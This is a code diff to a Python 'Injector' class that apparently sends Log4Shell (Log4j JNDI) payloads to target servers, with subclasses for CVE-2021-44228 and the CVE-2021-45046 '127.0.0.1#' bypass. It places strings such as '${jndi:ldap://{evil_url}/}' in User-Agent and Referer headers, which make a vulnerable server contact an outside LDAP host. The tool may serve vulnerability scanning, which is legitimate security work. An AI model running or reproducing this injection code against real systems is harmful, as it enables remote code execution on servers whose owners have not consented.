@@ -8,6 +8,8 @@ urllib3.disable_warnings()
 
 
 class Injector:
+    FORMAT_JNDI = None
+
     def __init__(self, targeted_domain: str, proxies: Dict[str, str]):
         self._targeted_domain = targeted_domain
         self._proxies = proxies
@@ -29,7 +31,9 @@ class Injector:
             victim_identifier = requests.utils.requote_uri(victim_identifier) + '.'
         else:
             victim_identifier = ''
-        jndi_url = f'${{jndi:ldap://{victim_identifier}{self._targeted_domain}/}}'
+        evil_url = f'{victim_identifier}{self._targeted_domain}'
+        jndi_url = self.FORMAT_JNDI.format(evil_url=evil_url)
+
         headers = {
             'User-Agent': jndi_url,
             'Referer': jndi_url,
@@ -64,3 +68,16 @@ class Injector:
                                             timeout=timeout)
             except:
                 pass
+
+
+
+class CVE_2021_44228_Injector(Injector):
+    FORMAT_JNDI = "${{jndi:ldap://{evil_url}/}}"
+
+
+
+class CVE_2021_45046_Injector(Injector):
+    FORMAT_JNDI = "${{jndi:ldap://127.0.0.1#{evil_url}/}}"
+
+
+
